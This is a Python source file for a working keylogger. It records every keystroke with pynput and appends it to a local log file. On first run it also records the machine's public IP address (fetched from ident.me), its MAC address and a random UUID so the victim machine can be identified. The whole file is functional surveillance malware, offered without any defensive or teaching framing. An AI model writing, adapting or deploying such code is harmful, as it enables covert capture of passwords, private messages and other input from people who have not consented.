from pynput.keyboard import Listener
from urllib import request
from time import sleep
import os
import uuid

file_path = os.path.join('.', 'output.txt')

special_inputs = {
    'Key.enter': '\n',
    'Key.space': ' ',
    'Key.tab': '\t',
    'Key.backspace': '\b'
}

def on_press(key):
    pass

def on_release(key, output):

    if 'char' in dir(key):     #check if char method exists (it is a letter)
        # removing the first and last character of the string here
        #  because pyinput writes a character with quotes like: 'a'
        keylogs = str(key)[1:-1]

    elif str(key) in special_inputs:
        keylogs = special_inputs[str(key)]

    else:
        return
        
    output.write(keylogs)
    

def main():

    # Creates output file and assigns a random id
    if not os.path.exists(file_path):

        # Find the IP and MAC address
        public_ip = request.urlopen('https://ident.me').read().decode('utf-8')
        mac_address = uuid.getnode()

        # Assign a UUID to uniquely identify this machine
        machine_id = uuid.uuid4()

        # Create the file and open in append mode
        with open(file_path, 'a+') as output:
            # Write the identifying information to it
            output.write(f'IP={str(public_ip)}\n')
            output.write(f'MAC={str(mac_address)}\n')
            output.write(f'UUID={str(machine_id)}\n')

    with open(file_path, 'a') as output:
        listener = Listener(
        on_press=on_press,
        on_release=lambda k: on_release(k, output))
        listener.start()
        while True:
            sleep(1)

if __name__ == '__main__':
    main()
